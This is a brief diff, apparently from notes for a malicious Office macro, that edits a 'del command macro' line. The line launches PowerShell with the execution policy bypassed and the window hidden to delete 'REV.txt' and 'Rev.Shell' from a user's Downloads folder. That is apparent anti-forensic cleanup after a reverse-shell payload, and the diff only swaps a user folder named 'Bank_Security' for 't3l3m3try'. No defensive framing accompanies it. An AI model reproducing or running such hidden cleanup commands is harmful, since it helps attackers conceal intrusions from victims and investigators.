@@ -11,5 +11,5 @@ End Sub
 
 
 del command macro:
-cmd.exe /c powershell –ExecutionPolicy Bypass -WindowStyle Hidden -command cd C:\Users\Bank_Security\Downloads\ && del C:\Users\Bank_Security\Downloads\REV.txt && del C:\Users\Bank_Security\Downloads\Rev.Shell
+cmd.exe /c powershell –ExecutionPolicy Bypass -WindowStyle Hidden -command cd C:\Users\t3l3m3try\Downloads\ && del C:\Users\t3l3m3try\Downloads\REV.txt && del C:\Users\t3l3m3try\Downloads\Rev.Shell
 
